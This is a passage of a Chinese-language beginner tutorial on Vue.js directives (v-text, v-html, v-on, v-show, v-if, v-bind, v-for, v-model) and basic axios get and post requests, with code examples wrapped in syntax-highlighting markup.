<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          data<span class="token punctuation">:</span><span class="token punctuation">{</span>              message<span class="token punctuation">:</span><span class="token string">"hello"</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">v-text</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>world<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--全部替换,输出为hello--></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>深圳{{message}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--部分替换--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h4 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h4><p>设置标签的innerHTML,内容中有html结构会被解析为标签</p><p>js:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          data<span class="token punctuation">:</span><span class="token punctuation">{</span>              content<span class="token punctuation">:</span><span class="token string">"&lt;a href='#'>hello&lt;/a>"</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">v-html</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h4 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h4><p>为元素绑定事件</p><p>js:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          method<span class="token punctuation">:</span><span class="token punctuation">{</span>          todo<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//逻辑</span>          <span class="token punctuation">}</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">v-on:</span>click</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>todo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token comment" spellcheck="true">&lt;!-- v-on:事件 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h3 id="显示切换，属性绑定"><a href="#显示切换，属性绑定" class="headerlink" title="显示切换，属性绑定"></a>显示切换，属性绑定</h3><h4 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h4><p>根据表达值的真假，切换元素的显示和隐藏</p><ul><li>v-show会自动将表达式转换为真值</li></ul><p>js:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          data<span class="token punctuation">:</span><span class="token punctuation">{</span>             isShow<span class="token punctuation">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>             age<span class="token punctuation">:</span><span class="token number">16</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>地址<span class="token punctuation">"</span></span> <span class="token attr-name">v-show</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>地址<span class="token punctuation">"</span></span> <span class="token attr-name">v-show</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>isShow<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>地址<span class="token punctuation">"</span></span> <span class="token attr-name">v-show</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>age<span class="token punctuation">></span><span class="token punctuation">=</span>18<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h4 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h4><p>根据表达值的真假，切换元素的显示和隐藏(直接操作dom元素)</p><p>js:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          data<span class="token punctuation">:</span><span class="token punctuation">{</span>             isShow<span class="token punctuation">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>地址<span class="token punctuation">"</span></span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>地址<span class="token punctuation">"</span></span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>isShow<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>地址<span class="token punctuation">"</span></span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>age<span class="token punctuation">></span><span class="token punctuation">=</span>18<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><blockquote><p>注：v-if操作的是dom，即真值为假时将该dom删除,v-show操作的是样式</p></blockquote><h4 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h4><p>设置元素的属性</p><p>js:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          data<span class="token punctuation">:</span><span class="token punctuation">{</span>             imgSrc<span class="token punctuation">:</span><span class="token string">"图片地址"</span><span class="token punctuation">,</span>             isActive<span class="token punctuation">:</span><span class="token boolean">false</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name"><span class="token namespace">v-bind:</span>src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>imgSrc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name"><span class="token namespace">v-bind:</span>class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{active:isActive,user:isActive}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>           <span class="token comment" spellcheck="true">&lt;!-- active/user类是否生效取决于isActive --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h3 id="列表循环，表单元素绑定"><a href="#列表循环，表单元素绑定" class="headerlink" title="列表循环，表单元素绑定"></a>列表循环，表单元素绑定</h3><h4 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h4><p>递归渲染若不加限制，会发生栈溢出。根据数据生成列表结构,把作为模板的标签根据数据的个数，拷贝若干份。</p><h5 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h5><p>js:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          data<span class="token punctuation">:</span><span class="token punctuation">{</span>              array<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>a          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item in array<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!--渲染4个li标签--></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h5 id="对象型-1"><a href="#对象型-1" class="headerlink" title="对象型"></a>对象型</h5><p>js：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          data<span class="token punctuation">:</span><span class="token punctuation">{</span>              objAa\rray<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span>                  <span class="token punctuation">{</span>name<span class="token punctuation">:</span><span class="token string">"zby"</span><span class="token punctuation">,</span>age<span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                  <span class="token punctuation">{</span>name<span class="token punctuation">:</span><span class="token string">"byz"</span><span class="token punctuation">,</span>age<span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">}</span>              <span class="token punctuation">}</span><span class="token punctuation">]</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item in ObjArray<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>{{item.name}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>show(item.name)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--item.name获取当前行name--></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>              <span class="token comment" spellcheck="true">&lt;!-- index为索引值，若不想获取索引值可按数字型的写法进行渲染 --></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><blockquote><p>注：使用v-for指令时，如果数组的长度发生改变，html渲染的标签个数也会随之改变。</p></blockquote><h4 id="v-on-1"><a href="#v-on-1" class="headerlink" title="v-on"></a>v-on</h4><p>传递自定义参数，事件修饰符(<a href="https://cn.vuejs.org/v2/api/#v-on" target="_blank" rel="noopener">https://cn.vuejs.org/v2/api/#v-on</a>)</p><p>js:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          methods<span class="token punctuation">:</span><span class="token punctuation">{</span>          todo<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">v-on:</span>click</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>todo(p1,p2)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h4 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h4><p>获取和设置单元素的值(双向数据绑定)，不论是更改html的值还是js的值，都会同时更新双方的值</p><p>js</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          message<span class="token punctuation">:</span><span class="token number">21</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>{{message}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p><img src="https://pic.downk.cc/item/5f21295014195aa5944e5429.png" alt=""></p><p><img src="https://pic.downk.cc/item/5f21296514195aa5944e5e4c.png" alt=""></p><h2 id="Vue的网络应用"><a href="#Vue的网络应用" class="headerlink" title="Vue的网络应用"></a>Vue的网络应用</h2><p>axios网络请求库</p><h3 id="引用-1"><a href="#引用-1" class="headerlink" title="引用"></a>引用</h3><p>在Vue中加入以下</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/axios/dist/axios.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><h4 id="get"><a href="#get" class="headerlink" title="get"></a>get</h4><pre class=" language-js"><code class="language-js">axios<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>地址<span class="token operator">?</span>key1<span class="token operator">=</span>value1<span class="token punctuation">,</span>key2<span class="token operator">=</span>value2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">                            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".get"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            axios<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"http://autumfish.cn/api/joke/list?num=6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">{</span>                                                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                         <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>                                                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>                                            <span class="token punctuation">}</span><span class="token punctuation">)</span>                                        <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p><img src="https://pic.downk.cc/item/5f2133c114195aa594541681.png" alt=""></p><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p>以上述网站为例子，获取笑话的方法：</p><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>jokes<span class="token punctuation">)</span></code></pre><h4 id="post"><a href="#post" class="headerlink" title="post"></a>post</h4><pre class=" language-js"><code class="language-js">axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>地址<span class="token punctuation">,</span><span class="token punctuation">{</span>key1<span class="token punctuation">:</span>value1<span class="token punctuation">,</span>key2<span class="token punctuation">:</span>value2<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><blockquote><p>参数需要使用post方式传递才能使后端通过request.body的方式获取</p></blockquote><h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">                            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".post"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            